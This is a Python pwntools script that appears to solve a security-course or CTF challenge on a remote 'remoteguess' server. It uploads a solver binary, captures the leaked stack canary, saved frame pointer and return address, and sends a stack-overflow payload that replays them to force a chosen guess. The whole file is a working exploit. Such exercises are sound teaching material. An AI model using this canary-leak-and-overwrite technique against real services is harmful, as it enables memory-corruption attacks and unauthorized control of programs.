#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
    r.recvuntil(b'received.')
    
    canary = r.recvuntil(b'canary')[-22:-6].decode()
    rbp = r.recvuntil(b'rbp')[-15:-3].decode()
    return_addr = r.recvuntil(b'return_addr')[-23:-11].decode()
    
    print(f"0xffffff55:{rbp}")
    print(f"0xab:{return_addr}")
    
    canary = int(canary, 16)
    canary = p64(canary)
    rbp = int(rbp, 16)
    rbp = p64(rbp)
    return_addr = int(return_addr, 16)
    return_addr = p64(return_addr)
    guess_num = 1212
    ans = b'1212\0'
    ans += b'0' * 19
    ans += canary
    ans += rbp
    ans += return_addr
    ans += b'0' * 12
    ans += p32(guess_num)
    print(ans)
    r.sendafter(b'answer? ', ans)

else:
    r.sendlineafter(b'send to me? ', b'0')


r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :